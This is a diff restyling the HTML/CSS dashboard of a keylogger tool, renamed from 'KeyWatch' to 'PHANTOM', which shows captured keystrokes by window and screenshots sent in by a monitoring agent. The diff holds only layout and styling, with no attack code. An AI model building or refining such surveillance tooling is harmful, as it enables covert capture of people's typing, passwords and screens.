@@ -3,376 +3,750 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>KeyWatch — Dashboard</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<title>PHANTOM // COMMAND CENTER</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Orbitron:wght@400;700;900&family=Fira+Code:wght@300;400;500;600&display=swap" rel="stylesheet"/>
 <style>
-  :root {
-    --bg: #0a0a0f;
-    --surface: #111118;
-    --surface2: #16161f;
-    --border: #1e1e2e;
-    --accent: #00ff88;
-    --accent2: #00c8ff;
-    --danger: #ff3366;
-    --warn: #ffaa00;
-    --text: #e0e0f0;
-    --muted: #555570;
-  }
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Syne', sans-serif;
-    min-height: 100vh;
-    display: grid;
-    grid-template-rows: auto 1fr;
-  }
-  body::before {
-    content:'';
-    position:fixed; inset:0;
-    background-image:
-      linear-gradient(rgba(0,255,136,.025) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,255,136,.025) 1px, transparent 1px);
-    background-size:40px 40px;
-    pointer-events:none; z-index:0;
-  }
+*{margin:0;padding:0;box-sizing:border-box;}
 
-  nav {
-    position:sticky; top:0; z-index:100;
-    background:rgba(10,10,15,.95);
-    backdrop-filter:blur(12px);
-    border-bottom:1px solid var(--border);
-    display:flex; align-items:center; justify-content:space-between;
-    padding:0 28px; height:56px;
-  }
-  .nav-logo { display:flex; align-items:center; gap:10px; }
-  .logo-mark { width:28px; height:28px; border:1.5px solid var(--accent); display:grid; place-items:center; font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent); }
-  .logo-text { font-family:'Share Tech Mono',monospace; font-size:13px; letter-spacing:3px; text-transform:uppercase; }
-  .nav-right { display:flex; align-items:center; gap:16px; }
-  .live-badge { display:flex; align-items:center; gap:6px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--accent); }
-  .live-dot { width:7px; height:7px; border-radius:50%; background:var(--accent); animation:pulse 1.5s ease-in-out infinite; }
-  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
-  .btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; text-transform:uppercase; background:transparent; padding:6px 14px; cursor:pointer; border-radius:2px; transition:all .2s; text-decoration:none; }
-  .btn-danger { border:1px solid var(--danger); color:var(--danger); }
-  .btn-danger:hover { background:rgba(255,51,102,.1); }
-  .btn-muted { border:1px solid var(--border); color:var(--muted); }
-  .btn-muted:hover { border-color:var(--text); color:var(--text); }
+:root{
+  --green:#00ff41;
+  --green-dim:#00aa2a;
+  --green-dark:#001a05;
+  --green-glow:rgba(0,255,65,0.15);
+  --cyan:#00ffff;
+  --red:#ff0040;
+  --yellow:#ffcc00;
+  --bg:#000500;
+  --surface:rgba(0,15,5,0.97);
+  --border:rgba(0,255,65,0.2);
+  --border-bright:rgba(0,255,65,0.6);
+}
 
-  main { position:relative; z-index:1; padding:24px 28px; display:flex; flex-direction:column; gap:20px; max-width:1400px; width:100%; margin:0 auto; }
+html,body{height:100%;}
 
-  /* STATS */
-  .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:14px; }
-  .stat-card { background:var(--surface); border:1px solid var(--border); border-radius:2px; padding:16px 20px; position:relative; overflow:hidden; }
-  .stat-card::before { content:''; position:absolute; top:0; left:0; width:3px; height:100%; }
-  .stat-card.green::before { background:var(--accent); }
-  .stat-card.blue::before  { background:var(--accent2); }
-  .stat-card.yellow::before{ background:var(--warn); }
-  .stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:8px; }
-  .stat-value { font-family:'Share Tech Mono',monospace; font-size:28px; font-weight:700; line-height:1; }
-  .stat-card.green  .stat-value { color:var(--accent); }
-  .stat-card.blue   .stat-value { color:var(--accent2); }
-  .stat-card.yellow .stat-value { color:var(--warn); }
+body{
+  background:var(--bg);
+  color:var(--green);
+  font-family:'Fira Code',monospace;
+  display:grid;
+  grid-template-rows:auto 1fr;
+  min-height:100vh;
+  overflow:hidden;
+  cursor:none;
+}
 
-  /* TABS */
-  .panel { background:var(--surface); border:1px solid var(--border); border-radius:2px; display:flex; flex-direction:column; flex:1; overflow:hidden; min-height:500px; }
-  .tab-bar { display:flex; border-bottom:1px solid var(--border); }
-  .tab-btn { font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:2px; text-transform:uppercase; background:transparent; border:none; border-bottom:2px solid transparent; color:var(--muted); padding:12px 22px; cursor:pointer; transition:color .2s,border-color .2s; margin-bottom:-1px; }
-  .tab-btn.active { color:var(--accent); border-bottom-color:var(--accent); }
-  .tab-btn:hover:not(.active) { color:var(--text); }
+/* Scanline */
+body::after{
+  content:'';
+  position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.015) 2px,rgba(0,255,65,0.015) 4px);
+  pointer-events:none;
+  z-index:1000;
+}
 
-  /* TOOLBAR */
-  .toolbar { display:flex; align-items:center; justify-content:space-between; padding:10px 16px; border-bottom:1px solid var(--border); background:var(--surface2); gap:12px; flex-wrap:wrap; }
-  .search-input { background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:12px; padding:6px 12px; border-radius:2px; outline:none; width:220px; transition:border-color .2s; }
-  .search-input:focus { border-color:var(--accent); }
-  .toggle-wrap { display:flex; align-items:center; gap:8px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); cursor:pointer; user-select:none; }
-  .toggle { width:32px; height:16px; background:var(--border); border-radius:8px; position:relative; transition:background .2s; flex-shrink:0; }
-  .toggle.on { background:var(--accent); }
-  .toggle::after { content:''; position:absolute; width:12px; height:12px; border-radius:50%; background:#fff; top:2px; left:2px; transition:transform .2s; }
-  .toggle.on::after { transform:translateX(16px); }
+/* Custom cursor */
+.cursor{position:fixed;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);}
+.cursor-outer{width:24px;height:24px;border:1px solid var(--green);border-radius:50%;transition:all .08s;}
+.cursor-inner{position:absolute;top:50%;left:50%;width:4px;height:4px;background:var(--green);border-radius:50%;transform:translate(-50%,-50%);}
 
-  /* LOG FEED — matches original format exactly */
-  .log-body { flex:1; overflow-y:auto; font-family:'Share Tech Mono',monospace; font-size:12.5px; line-height:1.6; }
-  .log-body::-webkit-scrollbar { width:4px; }
-  .log-body::-webkit-scrollbar-track { background:var(--bg); }
-  .log-body::-webkit-scrollbar-thumb { background:var(--border); }
+/* Matrix bg */
+#matrix-bg{position:fixed;inset:0;opacity:.08;z-index:0;}
 
-  .log-line {
-    display:flex;
-    align-items:baseline;
-    padding:4px 16px;
-    border-bottom:1px solid rgba(30,30,46,0.4);
-    gap:0;
-    animation:rowIn .25s ease forwards;
-    white-space:nowrap;
-    overflow:hidden;
-  }
-  @keyframes rowIn { from{opacity:0;background:rgba(0,255,136,.04)} to{opacity:1;background:transparent} }
-  .log-line:hover { background:var(--surface2); }
+/* Vignette */
+.vignette{position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.8) 100%);pointer-events:none;z-index:1;}
 
-  /* The pipe separators — styled exactly like the original file */
-  .log-ts   { color:var(--muted); flex-shrink:0; }
-  .sep      { color:#333350; padding:0 8px; flex-shrink:0; }
-  .log-win  { color:var(--accent2); overflow:hidden; text-overflow:ellipsis; flex:1; min-width:0; }
-  .log-key  { flex-shrink:0; padding-left:8px; font-weight:700; }
-  .log-key.char    { color:var(--accent); }
-  .log-key.special { color:var(--warn); }
-  .log-key.control { color:var(--danger); }
+/* Animations */
+@keyframes glitch{
+  0%,88%,100%{transform:translate(0);filter:none;}
+  90%{transform:translate(-2px,1px);filter:hue-rotate(90deg);}
+  92%{transform:translate(2px,-1px);}
+  94%{clip-path:inset(40% 0 20% 0);transform:translate(-3px,0);}
+  96%{clip-path:none;transform:translate(0);}
+}
+@keyframes flicker{0%,19%,21%,23%,25%,54%,56%,100%{opacity:1;}20%,24%,55%{opacity:.5;}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+@keyframes pulse-border{0%,100%{box-shadow:0 0 5px rgba(0,255,65,.3);}50%{box-shadow:0 0 20px rgba(0,255,65,.6),0 0 40px rgba(0,255,65,.2);}}
+@keyframes slideIn{from{opacity:0;transform:translateY(-8px);}to{opacity:1;transform:translateY(0);}}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+@keyframes rowFlash{from{background:rgba(0,255,65,.12);}to{background:transparent;}}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+@keyframes scanline{0%{top:-5%;}100%{top:105%;}}
 
-  .empty-state { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; height:300px; color:var(--muted); font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:2px; }
-  .empty-icon { font-size:36px; opacity:.2; }
+/* ── TOPBAR ── */
+.topbar{
+  position:relative;z-index:100;
+  background:rgba(0,8,3,0.98);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;
+  padding:0 20px;height:52px;gap:20px;
+  backdrop-filter:blur(10px);
+}
 
-  /* PAGINATION */
-  .pagination { display:flex; align-items:center; gap:8px; padding:10px 16px; border-top:1px solid var(--border); background:var(--surface2); }
-  .pg-btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:1px; background:transparent; border:1px solid var(--border); color:var(--muted); padding:5px 12px; cursor:pointer; border-radius:2px; transition:all .2s; }
-  .pg-btn:hover:not(:disabled) { border-color:var(--accent); color:var(--accent); }
-  .pg-btn:disabled { opacity:.3; cursor:default; }
-  .pg-info { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); letter-spacing:1px; }
+.topbar-logo{
+  display:flex;align-items:center;gap:10px;
+  border-right:1px solid var(--border);
+  padding-right:20px;
+}
 
-  /* SCREENSHOTS */
-  .ss-grid { padding:16px; display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:14px; overflow-y:auto; }
-  .ss-card { background:var(--bg); border:1px solid var(--border); border-radius:2px; overflow:hidden; cursor:pointer; transition:border-color .2s,transform .15s; }
-  .ss-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
-  .ss-img { width:100%; display:block; aspect-ratio:16/9; object-fit:cover; }
-  .ss-meta { padding:7px 12px; display:flex; justify-content:space-between; align-items:center; gap:8px; }
-  .ss-ts  { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); flex-shrink:0; }
-  .ss-win { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.logo-hex{
+  width:32px;height:32px;
+  border:1.5px solid var(--green);
+  transform:rotate(45deg);
+  display:grid;place-items:center;
+  animation:pulse-border 3s infinite;
+}
+.logo-hex span{
+  transform:rotate(-45deg);
+  font-family:'Orbitron',monospace;
+  font-size:10px;font-weight:900;
+  color:var(--green);
+}
+.logo-name{
+  font-family:'Orbitron',monospace;
+  font-size:14px;font-weight:900;
+  letter-spacing:4px;
+  animation:glitch 10s infinite;
+}
+.logo-sub{font-size:8px;letter-spacing:3px;color:var(--green-dim);}
 
-  /* LIGHTBOX */
-  .lightbox { display:none; position:fixed; inset:0; background:rgba(0,0,0,.93); z-index:999; align-items:center; justify-content:center; flex-direction:column; gap:12px; }
-  .lightbox.open { display:flex; }
-  .lightbox img { max-width:92vw; max-height:82vh; border:1px solid var(--border); }
-  .lb-meta { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:1px; }
-  .lb-close { position:absolute; top:20px; right:24px; font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--muted); cursor:pointer; background:none; border:none; letter-spacing:2px; }
-  .lb-close:hover { color:var(--text); }
+/* Status pills */
+.status-row{display:flex;gap:10px;align-items:center;}
+.pill{
+  display:flex;align-items:center;gap:5px;
+  padding:4px 10px;
+  border:1px solid var(--border);
+  font-size:9px;letter-spacing:2px;text-transform:uppercase;
+  font-family:'Orbitron',monospace;
+}
+.pill-dot{width:6px;height:6px;border-radius:50%;}
+.pill-dot.green{background:var(--green);box-shadow:0 0 6px var(--green);animation:blink 2s ease-in-out infinite;}
+.pill-dot.cyan{background:var(--cyan);box-shadow:0 0 6px var(--cyan);}
+.pill.live{border-color:rgba(0,255,65,.4);color:var(--green);}
+.pill.secure{border-color:rgba(0,255,255,.3);color:var(--cyan);}
+
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
+.sys-clock{font-family:'VT323',monospace;font-size:18px;color:var(--green-dim);letter-spacing:2px;}
+
+.cmd-btn{
+  font-family:'Orbitron',monospace;font-size:8px;letter-spacing:2px;
+  background:transparent;padding:6px 14px;cursor:pointer;
+  border-radius:0;text-transform:uppercase;transition:all .2s;
+}
+.cmd-btn.danger{border:1px solid rgba(255,0,64,.5);color:var(--red);}
+.cmd-btn.danger:hover{background:rgba(255,0,64,.1);box-shadow:0 0 10px rgba(255,0,64,.3);}
+.cmd-btn.logout{border:1px solid var(--border);color:var(--green-dim);text-decoration:none;display:inline-flex;align-items:center;}
+.cmd-btn.logout:hover{border-color:var(--green);color:var(--green);}
+
+/* ── MAIN GRID ── */
+.main{
+  position:relative;z-index:10;
+  display:grid;
+  grid-template-columns:260px 1fr;
+  grid-template-rows:1fr;
+  gap:0;
+  overflow:hidden;
+  height:100%;
+}
+
+/* ── SIDEBAR ── */
+.sidebar{
+  border-right:1px solid var(--border);
+  background:rgba(0,5,2,.98);
+  display:flex;flex-direction:column;
+  overflow:hidden;
+}
+
+.sidebar-section{
+  border-bottom:1px solid var(--border);
+  padding:14px;
+}
+
+.sidebar-label{
+  font-family:'Orbitron',monospace;
+  font-size:8px;letter-spacing:3px;
+  color:var(--green-dim);
+  margin-bottom:12px;
+  display:flex;align-items:center;gap:6px;
+}
+.sidebar-label::before{content:'//';color:rgba(0,255,65,.3);}
+
+/* Stat widgets */
+.stat-widget{
+  display:flex;flex-direction:column;gap:1px;
+  margin-bottom:10px;
+}
+.stat-widget:last-child{margin-bottom:0;}
+
+.stat-top{display:flex;justify-content:space-between;align-items:baseline;}
+.stat-name{font-size:9px;letter-spacing:2px;color:var(--green-dim);text-transform:uppercase;}
+.stat-num{
+  font-family:'VT323',monospace;
+  font-size:30px;line-height:1;
+  color:var(--green);
+  text-shadow:0 0 10px rgba(0,255,65,.5);
+}
+.stat-num.cyan{color:var(--cyan);text-shadow:0 0 10px rgba(0,255,255,.5);}
+.stat-num.yellow{color:var(--yellow);text-shadow:0 0 10px rgba(255,204,0,.5);}
+
+.stat-bar{height:2px;background:rgba(0,255,65,.1);margin-top:4px;overflow:hidden;}
+.stat-bar-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));width:0%;transition:width 1s ease;}
+
+/* Window activity */
+.win-list{display:flex;flex-direction:column;gap:6px;}
+.win-item{}
+.win-name{font-size:9px;color:var(--green-dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:3px;}
+.win-track{height:2px;background:rgba(0,255,65,.08);overflow:hidden;}
+.win-fill{height:100%;background:linear-gradient(90deg,var(--green-dim),var(--cyan));transition:width .8s ease;}
+.win-count{font-family:'VT323',monospace;font-size:14px;color:var(--green-dim);float:right;}
+
+/* Nav tabs */
+.nav-tabs{padding:8px;}
+.nav-tab{
+  display:flex;align-items:center;gap:8px;
+  padding:8px 10px;
+  font-size:10px;letter-spacing:2px;text-transform:uppercase;
+  cursor:pointer;border:1px solid transparent;
+  margin-bottom:4px;transition:all .2s;color:var(--green-dim);
+  font-family:'Orbitron',monospace;
+}
+.nav-tab:hover{border-color:var(--border);color:var(--green);background:var(--green-glow);}
+.nav-tab.active{border-color:var(--green);color:var(--green);background:rgba(0,255,65,.08);box-shadow:inset 3px 0 0 var(--green);}
+.nav-tab-icon{font-size:14px;width:18px;text-align:center;}
+
+/* Agent info */
+.agent-info{padding:12px 14px;margin-top:auto;border-top:1px solid var(--border);}
+.agent-line{font-size:9px;color:rgba(0,255,65,.3);letter-spacing:1px;margin-bottom:4px;}
+.agent-val{color:var(--green-dim);}
+
+/* ── CONTENT AREA ── */
+.content{
+  display:flex;flex-direction:column;
+  overflow:hidden;
+}
+
+/* Panes */
+.pane{display:none;flex-direction:column;flex:1;overflow:hidden;}
+.pane.active{display:flex;}
+
+/* Toolbar */
+.toolbar{
+  display:flex;align-items:center;gap:12px;
+  padding:8px 14px;
+  border-bottom:1px solid var(--border);
+  background:rgba(0,8,3,.95);
+  flex-shrink:0;
+}
+
+.search-wrap{
+  display:flex;align-items:center;
+  border:1px solid var(--border);
+  background:rgba(0,255,65,.02);
+  flex:1;max-width:300px;
+  transition:all .2s;
+}
+.search-wrap:focus-within{border-color:var(--green);box-shadow:0 0 10px rgba(0,255,65,.15);}
+.search-prefix{padding:0 8px;font-family:'VT323',monospace;font-size:16px;color:var(--green-dim);}
+.search-input{
+  flex:1;background:transparent;border:none;outline:none;
+  color:var(--green);font-family:'Fira Code',monospace;font-size:11px;
+  padding:7px 8px 7px 0;letter-spacing:1px;
+}
+.search-input::placeholder{color:rgba(0,255,65,.2);}
+
+.toggle-wrap{
+  display:flex;align-items:center;gap:8px;
+  font-family:'Orbitron',monospace;font-size:8px;letter-spacing:2px;
+  color:var(--green-dim);cursor:pointer;user-select:none;
+}
+.toggle{width:34px;height:16px;background:rgba(0,255,65,.1);border:1px solid var(--border);border-radius:0;position:relative;transition:all .2s;}
+.toggle.on{background:rgba(0,255,65,.2);border-color:var(--green);}
+.toggle::after{content:'';position:absolute;width:10px;height:10px;background:var(--green-dim);top:2px;left:2px;transition:all .2s;}
+.toggle.on::after{left:20px;background:var(--green);box-shadow:0 0 6px var(--green);}
+
+.toolbar-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
+.pg-btn{
+  font-family:'Orbitron',monospace;font-size:8px;letter-spacing:1px;
+  background:transparent;border:1px solid var(--border);color:var(--green-dim);
+  padding:5px 12px;cursor:pointer;transition:all .2s;
+}
+.pg-btn:hover:not(:disabled){border-color:var(--green);color:var(--green);}
+.pg-btn:disabled{opacity:.2;cursor:default;}
+.pg-info{font-family:'VT323',monospace;font-size:14px;color:var(--green-dim);}
+
+/* ── LOG FEED ── */
+.log-feed{flex:1;overflow-y:auto;position:relative;}
+.log-feed::-webkit-scrollbar{width:3px;}
+.log-feed::-webkit-scrollbar-track{background:transparent;}
+.log-feed::-webkit-scrollbar-thumb{background:var(--green-dark);}
+
+/* Moving scan line */
+.scanline-effect{
+  position:absolute;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,rgba(0,255,65,.4),transparent);
+  pointer-events:none;
+  animation:scanline 4s linear infinite;
+  z-index:5;
+}
+
+.log-row{
+  display:grid;
+  grid-template-columns:155px auto 1fr auto;
+  gap:0;
+  padding:3px 14px;
+  border-bottom:1px solid rgba(0,255,65,.04);
+  align-items:baseline;
+  font-size:12px;
+  line-height:1.7;
+  transition:background .1s;
+  animation:rowFlash .6s ease forwards;
+  position:relative;
+}
+.log-row:hover{background:rgba(0,255,65,.04);}
+.log-row:hover::before{content:'>';position:absolute;left:4px;color:var(--green);font-size:10px;}
+
+.log-ts{color:rgba(0,255,65,.4);font-size:11px;letter-spacing:.5px;flex-shrink:0;}
+.log-sep{color:rgba(0,255,65,.15);padding:0 10px;flex-shrink:0;}
+.log-win{color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px;}
+.log-key{text-align:right;font-weight:600;font-size:12px;padding-left:12px;flex-shrink:0;}
+.log-key.char{color:var(--green);text-shadow:0 0 6px rgba(0,255,65,.4);}
+.log-key.special{color:var(--yellow);}
+.log-key.control{color:var(--red);}
+
+.empty-feed{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  height:100%;gap:12px;color:rgba(0,255,65,.2);
+  font-family:'VT323',monospace;font-size:18px;letter-spacing:3px;
+}
+.empty-feed .big{font-size:48px;animation:blink 2s ease-in-out infinite;}
+
+/* ── SCREENSHOTS ── */
+.ss-grid{
+  flex:1;overflow-y:auto;
+  padding:14px;
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(260px,1fr));
+  gap:12px;
+  align-content:start;
+}
+.ss-grid::-webkit-scrollbar{width:3px;}
+.ss-grid::-webkit-scrollbar-thumb{background:var(--green-dark);}
+
+.ss-card{
+  border:1px solid var(--border);
+  background:rgba(0,15,5,.8);
+  cursor:pointer;
+  transition:all .2s;
+  position:relative;
+  overflow:hidden;
+  animation:fadeIn .4s ease forwards;
+}
+.ss-card::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 60%,rgba(0,0,0,.8));
+  z-index:1;pointer-events:none;
+}
+.ss-card:hover{border-color:var(--cyan);transform:scale(1.02);box-shadow:0 0 20px rgba(0,255,255,.15);}
+.ss-card:hover .ss-overlay{opacity:1;}
+
+.ss-overlay{
+  position:absolute;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(0,255,65,.05);
+  opacity:0;transition:opacity .2s;z-index:2;
+  font-family:'VT323',monospace;font-size:16px;letter-spacing:3px;color:var(--green);
+}
+
+.ss-img{width:100%;display:block;aspect-ratio:16/9;object-fit:cover;filter:sepia(.1) hue-rotate(80deg);}
+.ss-meta{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:6px 10px;z-index:3;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.ss-ts{font-family:'VT323',monospace;font-size:13px;color:rgba(0,255,65,.7);}
+.ss-win{font-size:9px;color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:140px;}
+
+/* ── LIGHTBOX ── */
+.lightbox{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,.96);z-index:9998;
+  align-items:center;justify-content:center;flex-direction:column;gap:14px;
+}
+.lightbox.open{display:flex;}
+.lb-frame{
+  border:1px solid var(--green);
+  box-shadow:0 0 40px rgba(0,255,65,.3);
+  position:relative;max-width:90vw;
+}
+.lb-frame img{display:block;max-width:90vw;max-height:80vh;filter:sepia(.1) hue-rotate(80deg);}
+.lb-scanline{position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(0,255,65,.6),transparent);animation:scanline 2s linear infinite;}
+.lb-meta{font-family:'VT323',monospace;font-size:14px;color:var(--green-dim);letter-spacing:2px;}
+.lb-close{
+  position:absolute;top:16px;right:20px;
+  font-family:'Orbitron',monospace;font-size:9px;letter-spacing:3px;
+  color:var(--red);background:none;border:1px solid rgba(255,0,64,.4);
+  padding:6px 12px;cursor:pointer;transition:all .2s;
+}
+.lb-close:hover{background:rgba(255,0,64,.1);}
+
+/* Responsive */
+@media(max-width:800px){
+  .main{grid-template-columns:1fr;}
+  .sidebar{display:none;}
+}
 </style>
 </head>
 <body>
 
-<nav>
-  <div class="nav-logo">
-    <div class="logo-mark">KW</div>
-    <span class="logo-text">KeyWatch</span>
-  </div>
-  <div class="nav-right">
-    <div class="live-badge"><div class="live-dot"></div>LIVE</div>
-    <button class="btn btn-danger" onclick="clearLogs()">CLEAR ALL</button>
-    <a href="/logout" class="btn btn-muted">LOGOUT</a>
-  </div>
-</nav>
+<div class="cursor" id="cursor">
+  <div class="cursor-outer"></div>
+  <div class="cursor-inner"></div>
+</div>
+<canvas id="matrix-bg"></canvas>
+<div class="vignette"></div>
 
-<main>
-
-  <!-- STATS -->
-  <div class="stats-row">
-    <div class="stat-card green">
-      <div class="stat-label">Total Keystrokes</div>
-      <div class="stat-value" id="stat-total">—</div>
-    </div>
-    <div class="stat-card blue">
-      <div class="stat-label">Active Windows</div>
-      <div class="stat-value" id="stat-windows">—</div>
-    </div>
-    <div class="stat-card yellow">
-      <div class="stat-label">Screenshots</div>
-      <div class="stat-value" id="stat-ss">—</div>
+<!-- TOPBAR -->
+<header class="topbar">
+  <div class="topbar-logo">
+    <div class="logo-hex"><span>PH</span></div>
+    <div>
+      <div class="logo-name">PHANTOM</div>
+      <div class="logo-sub">KEYSTROKE INTELLIGENCE</div>
     </div>
   </div>
 
-  <!-- PANEL -->
-  <div class="panel">
-    <div class="tab-bar">
-      <button class="tab-btn active" id="tab-keys" onclick="switchTab('keys')">⌨ Keystrokes</button>
-      <button class="tab-btn"        id="tab-ss"   onclick="switchTab('ss')">📸 Screenshots</button>
+  <div class="status-row">
+    <div class="pill live"><div class="pill-dot green"></div>LIVE FEED</div>
+    <div class="pill secure"><div class="pill-dot cyan"></div>ENCRYPTED</div>
+  </div>
+
+  <div class="topbar-right">
+    <div class="sys-clock" id="sys-clock">00:00:00</div>
+    <button class="cmd-btn danger" onclick="clearLogs()">[ PURGE LOGS ]</button>
+    <a href="/logout" class="cmd-btn logout">[ DISCONNECT ]</a>
+  </div>
+</header>
+
+<!-- MAIN -->
+<div class="main">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">System Metrics</div>
+      <div class="stat-widget">
+        <div class="stat-top">
+          <span class="stat-name">Keystrokes</span>
+          <span class="stat-num" id="s-keys">0</span>
+        </div>
+        <div class="stat-bar"><div class="stat-bar-fill" id="bar-keys"></div></div>
+      </div>
+      <div class="stat-widget">
+        <div class="stat-top">
+          <span class="stat-name">Screenshots</span>
+          <span class="stat-num cyan" id="s-ss">0</span>
+        </div>
+        <div class="stat-bar"><div class="stat-bar-fill" id="bar-ss" style="background:linear-gradient(90deg,var(--cyan),var(--green));"></div></div>
+      </div>
+      <div class="stat-widget">
+        <div class="stat-top">
+          <span class="stat-name">Active Windows</span>
+          <span class="stat-num yellow" id="s-wins">0</span>
+        </div>
+      </div>
     </div>
+
+    <div class="sidebar-section" style="flex:1;overflow:hidden;">
+      <div class="sidebar-label">Window Activity</div>
+      <div class="win-list" id="win-list">
+        <div style="font-size:10px;color:rgba(0,255,65,.2);letter-spacing:2px;">AWAITING DATA...</div>
+      </div>
+    </div>
+
+    <div class="nav-tabs">
+      <div class="sidebar-label">Navigation</div>
+      <div class="nav-tab active" id="nav-keys" onclick="switchTab('keys')">
+        <span class="nav-tab-icon">⌨</span>KEYSTROKE FEED
+      </div>
+      <div class="nav-tab" id="nav-ss" onclick="switchTab('ss')">
+        <span class="nav-tab-icon">📸</span>SCREENSHOTS
+      </div>
+    </div>
+
+    <div class="agent-info">
+      <div class="agent-line">SESSION <span class="agent-val" id="a-session">ACTIVE</span></div>
+      <div class="agent-line">UPTIME <span class="agent-val" id="a-uptime">00:00:00</span></div>
+      <div class="agent-line">STATUS <span class="agent-val" style="color:var(--green);">MONITORING<span style="animation:blink 1s infinite;display:inline-block;">_</span></span></div>
+    </div>
+
+  </aside>
+
+  <!-- CONTENT -->
+  <div class="content">
 
     <!-- KEYSTROKE PANE -->
-    <div id="pane-keys" style="display:flex;flex-direction:column;flex:1;overflow:hidden;">
+    <div class="pane active" id="pane-keys">
       <div class="toolbar">
-        <input class="search-input" type="text" id="search-input" placeholder="Filter by window..." oninput="filterLogs()"/>
+        <div class="search-wrap">
+          <span class="search-prefix">&gt;_</span>
+          <input class="search-input" type="text" id="search" placeholder="filter by window..." oninput="doFilter()"/>
+        </div>
         <label class="toggle-wrap" onclick="toggleAR()">
-          AUTO-REFRESH <div class="toggle on" id="ar-toggle"></div>
+          AUTO-REFRESH
+          <div class="toggle on" id="ar-toggle"></div>
         </label>
+        <div class="toolbar-right">
+          <button class="pg-btn" id="prev-btn" onclick="changePg(-1)" disabled>◄ PREV</button>
+          <span class="pg-info" id="pg-info">1/1</span>
+          <button class="pg-btn" id="next-btn" onclick="changePg(1)">NEXT ►</button>
+          <span class="pg-info" id="total-info" style="color:rgba(0,255,65,.4);"></span>
+        </div>
       </div>
-      <div class="log-body" id="log-body"></div>
-      <div class="pagination">
-        <button class="pg-btn" id="prev-btn" onclick="changePage(-1)" disabled>← PREV</button>
-        <span class="pg-info" id="pg-info">Page 1 / 1</span>
-        <button class="pg-btn" id="next-btn" onclick="changePage(1)">NEXT →</button>
-        <span class="pg-info" style="margin-left:auto" id="total-info">0 events</span>
+
+      <div class="log-feed" id="log-feed">
+        <div class="scanline-effect"></div>
+        <div class="empty-feed">
+          <div class="big">⌨</div>
+          <div>AWAITING KEYSTROKES</div>
+          <div style="font-size:12px;opacity:.5;">AGENT MUST BE RUNNING</div>
+        </div>
       </div>
     </div>
 
-    <!-- SCREENSHOT PANE -->
-    <div id="pane-ss" style="display:none;flex-direction:column;flex:1;overflow:hidden;">
+    <!-- SCREENSHOTS PANE -->
+    <div class="pane" id="pane-ss">
       <div class="toolbar">
-        <span class="pg-info">Last 20 screenshots — cleared on server restart</span>
-        <label class="toggle-wrap" onclick="toggleAR()">
-          AUTO-REFRESH <div class="toggle on" id="ar-toggle-ss"></div>
-        </label>
+        <span style="font-family:'VT323',monospace;font-size:16px;letter-spacing:3px;color:var(--green-dim);">// SCREENSHOT ARCHIVE — LAST 20 FRAMES</span>
+        <div class="toolbar-right">
+          <label class="toggle-wrap" onclick="toggleAR()">
+            AUTO-REFRESH
+            <div class="toggle on" id="ar-toggle-ss"></div>
+          </label>
+        </div>
       </div>
       <div class="ss-grid" id="ss-grid">
-        <div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>
+        <div class="empty-feed" style="grid-column:1/-1;">
+          <div class="big">📷</div>
+          <div>NO FRAMES CAPTURED</div>
+        </div>
       </div>
     </div>
 
